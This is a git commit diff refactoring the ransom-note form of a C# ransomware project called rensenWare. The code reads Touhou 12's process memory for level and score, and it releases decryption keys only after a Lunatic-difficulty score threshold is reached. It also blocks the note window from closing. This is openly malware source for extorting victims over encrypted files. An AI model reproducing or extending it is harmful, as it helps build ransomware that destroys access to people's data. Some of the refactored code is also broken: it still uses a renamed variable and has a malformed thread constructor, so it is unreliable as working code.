1aafe3b85b31f6790c2512c8d3d4b8fdc3c55d12
P.Knowledge <doctor@kangnang.net>
2017-12-19 00:58:46 +0900

    Refactored Once More

--- RansomNote.cs
+++ RansomNote.cs
@@ -9,39 +9,35 @@ using System.Windows.Forms;
 using System.Security.Cryptography;
 using System.IO;
 
-
 namespace rensenWare
 {
-    // Previous name was frmWarning
     public partial class RansomNote : Form
     {
-        private bool _flag;
+        private bool _processStatus;
         private bool IsScoreReached = false;
 
         private IntPtr _handle; // Handle for TH12.exe Process
 
-        public bool flag
+        public bool processStatus
         {
             get
             {
-                return _flag;
+                return _processStatus;
             }
 
             set
             {
-                _flag = value;
+                _processStatus = value;
                 
-                if(_flag)
+                if(_processStatus)
                 {
-                    ProcStatus.Invoke(new MethodInvoker(() =>
-                   {
-                       ProcStatus.Text = "Detected";
-                   }));
+                    ProcStatus.Invoke(new MethodInvoker(() => {
+                        ProcStatus.Text = "Detected";
+                    }));
                 }
                 else
                 {
-                    ProcStatus.Invoke(new MethodInvoker(() =>
-                    {
+                    ProcStatus.Invoke(new MethodInvoker(() => {
                         ProcStatus.Text = "Process Killed!";
                     }));
                 }
@@ -76,168 +72,160 @@ namespace rensenWare
         static extern bool ReadProcessMemory(int hProcess, int lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);
 
 
-        public frmWarning()
+        public RansomNote()
         {
             InitializeComponent();
 
             // For Non-Blocking UI Application
-            new Thread(new ThreadStart(() =>
+            new Thread(new ThreadStart(Detect).Start();
+        }
+
+        private void Detect()
+        {
+            while (true)
             {
-                while (true)
+                if (!flag)
                 {
-                    if (!flag)
+                    var Procs = Process.GetProcessesByName("th12");
+
+                    if (Procs.Length > 0)
                     {
-                        var Procs = Process.GetProcessesByName("th12");
+                        // Open TH12.exe with PROCESS_VM_READ (0x0010).
+                        _handle = OpenProcess(0x10, false, Procs.FirstOrDefault().Id);
 
-                        if (Procs.Length > 0)
-                        {
-                            // Open TH12.exe with PROCESS_VM_READ (0x0010).
-                            _handle = OpenProcess(0x10, false, Procs.FirstOrDefault().Id);
+                        if (_handle != null)
+                            processStatus = true;
+                    }
+                }
+                else
+                {
+                    if (IsScoreReached)
+                    {
+                        break;
+                    }
+                    
+                    int bytesRead = 0;
+                    byte[] _buffer = new byte[4]; // Will read 4 bytes of memory
 
-                            if (_handle != null)
-                                flag = true;
-                        }
+                    /*
+                     * Read Level
+                     * 
+                     * In TH12 ~ Undefined Fantastic Object, Level is stored in
+                     * [base address] + 0xAEBD0, as 4bytes int value.
+                     * 
+                     */ 
+                    var readLevel = ReadProcessMemory((int)_handle, 0x004AEBD0, _buffer, 2, ref bytesRead);
+                    if (!readLevel)
+                    {
+                        flag = false;
+                        continue;
+                    }
+
+                    /*
+                     * Level Codes
+                     * 0 - Easy; 1 - Normal; 2 - Hard; 3 - Lunatic; ? - Extra
+                     * 
+                     */
+                    if (BitConverter.ToInt16(_buffer, 0) != 3)
+                    {
+                        ProcStatus.Invoke(new MethodInvoker(() => {
+                            ProcStatus.Text = "NOT LUNATIC LEVEL!";
+                        }));
+
+                        Thread.Sleep(100);
+                        continue;
                     }
                     else
                     {
-                        if (!IsScoreReached)
-                        {
-                            int bytesRead = 0;
-                            byte[] _buffer = new byte[4]; // Will read 4 bytes of memory
-
-                            /*
-                             * Read Level
-                             * 
-                             * In TH12 ~ Undefined Fantastic Object, Level is stored in
-                             * [base address] + 0xAEBD0, as 4bytes int value.
-                             * 
-                             */ 
-                            var readLevel = ReadProcessMemory((int)_handle, 0x004AEBD0, _buffer, 2, ref bytesRead);
-                            if (!readLevel)
-                            {
-                                flag = false;
-                                continue;
-                            }
-
-                            /*
-                             * Level Codes
-                             * 0 - Easy; 1 - Normal; 2 - Hard; 3 - Lunatic; ? - Extra
-                             * 
-                             */
-                            if (BitConverter.ToInt16(_buffer, 0) != 3)
-                            {
-                                ProcStatus.Invoke(new MethodInvoker(() =>
-                                {
-                                    ProcStatus.Text = "NOT LUNATIC LEVEL!";
-                                }));
-
-                                Thread.Sleep(100);
-                                continue;
-                            }
-                            else
-                            {
-                                ProcStatus.Invoke(new MethodInvoker(() =>
-                                {
-                                    ProcStatus.Text = "Process Working";
-                                }));
-                            }
-
-
-                            /*
-                             * Read Score
-                             * 
-                             * Once level is detected as LUNATIC, 
-                             * rensenWare reads score from process.
-                             * 
-                             * Score is stored in
-                             * [base address] + 0xB0C44, as 4bytes int value.
-                             * 
-                             */
-                            var readScore = ReadProcessMemory((int)_handle, 0x004B0C44, _buffer, 4, ref bytesRead);
-                            if (!readScore)
-                            {
-                                flag = false;
-                                Thread.Sleep(100);
-                                continue;
-                            }
-
-                            ScoreStatus.Invoke(new MethodInvoker(() =>
-                            {
-                                ScoreStatus.Text = (BitConverter.ToInt32(_buffer, 0) * 10).ToString();
-                            }));
-
-                            /*
-                             * One interesting thing,
-                             * internally, touhou project process prints score as 10 times of original value.
-                             * I don't know why it is.
-                             */ 
-                            if (BitConverter.ToInt32(_buffer, 0) > 20000000) // It is 20,000,000
-                                IsScoreReached = true;
-                            else
-                                _buffer = null;
-
-                            // Let CPU rest
-                            Thread.Sleep(100);
-                        }
-                        else // When scores 0.2 billion...
-                        {
-                            // Create Random Key/IV File in Desktop of Current User.
-                            File.WriteAllBytes(Program.KeyFilePath, Program.randomKey);
-                            File.WriteAllBytes(Program.IVFilePath, Program.randomIV);
-
-                            decryptProgress.Maximum = Program.encryptedFiles.Count;
-
-
-                            foreach (var path in Program.encryptedFiles)
-                            {
-                                try
-                                {
-                                    DecryptStatus.Invoke(new MethodInvoker(() =>
-                                    {
-                                        DecryptStatus.Text = Path.GetFileName(path);
-                                    }));
-
-                                    // Do Nothing!
-                                    // Program.Crypt(path, true);
-
-                                    decryptProgress.Value++;
-
-                                    // Let CPU rest (?)
-                                    // Thread.Sleep(100);
-                                }
-                                catch
-                                {
-                                    continue;
-                                }
-                            }
-
-                            this.Invoke(new MethodInvoker(() =>
-                            {
-                                MessageBox.Show("Decryption Complete!\nIf there are encrypted files exists, use manual decrypter with key/IV files saved in desktop!");
-                                
-                                ButtonManualDecrypt.Visible = true;
-                                ButtonExit.Visible = true;
-                            }));
-
-                            break;
-                        }
+                        ProcStatus.Invoke(new MethodInvoker(() => {
+                            ProcStatus.Text = "Process Working";
+                        }));
                     }
 
-                    Thread.Sleep(100);
+                    /*
+                     * Read Score
+                     * 
+                     * Once level is detected as LUNATIC, 
+                     * rensenWare reads score from process.
+                     * 
+                     * Score is stored in
+                     * [base address] + 0xB0C44, as 4bytes int value.
+                     * 
+                     */
+                    var readScore = ReadProcessMemory((int)_handle, 0x004B0C44, _buffer, 4, ref bytesRead);
+                    if (!readScore)
+                    {
+                        flag = false;
+                        Thread.Sleep(100);
+                        continue;
+                    }
+
+                    ScoreStatus.Invoke(new MethodInvoker(() =>
+                    {
+                        ScoreStatus.Text = (BitConverter.ToInt32(_buffer, 0) * 10).ToString();
+                    }));
+
+                    /*
+                     * One interesting thing,
+                     * internally, touhou project process prints score as 10 times of original value.
+                     * I don't know why it is.
+                     */ 
+                    if (BitConverter.ToInt32(_buffer, 0) > 20000000) // It is 20,000,000
+                        IsScoreReached = true;
+                    else
+                        _buffer = null;
                 }
-            })).Start();
+
+                // Let CPU rest
+                Thread.Sleep(100);
+            }
+
+            // Create Random Key/IV File in Desktop of Current User.
+            File.WriteAllBytes(Program.KeyFilePath, Program.randomKey);
+            File.WriteAllBytes(Program.IVFilePath, Program.randomIV);
+
+            decryptProgress.Maximum = Program.encryptedFiles.Count;
+
+            foreach (var path in Program.encryptedFiles)
+            {
+                try
+                {
+                    DecryptStatus.Invoke(new MethodInvoker(() =>
+                    {
+                        DecryptStatus.Text = Path.GetFileName(path);
+                    }));
+
+                    // Do Decrypt
+
+                    decryptProgress.Value++;
+                }
+                catch
+                {
+                    continue;
+                }
+            }
+
+            this.Invoke(new MethodInvoker(() => {
+                MessageBox.Show("Decryption Complete!\nIf there are encrypted files exists, use manual decrypter with key/IV files saved in desktop!");
+                
+                ButtonManualDecrypt.Visible = true;
+                ButtonExit.Visible = true;
+            }));            
         }
 
+        // Prevent Ransomnote Closing
         private void Prevent(object sender, FormClosingEventArgs e)
         {
             e.Cancel = true;
         }
 
+        // Ransomnote Close Button (When decryption completed)
         private void ButtonExit_Click(object sender, EventArgs e)
         {
             Environment.Exit(0);
         }
 
+        // ManualDecryper (When decryption completed)
         private void ButtonManualDecrypt_Click(object sender, EventArgs e)
         {
             var ManDecrypt = new frmManualDecrypter();
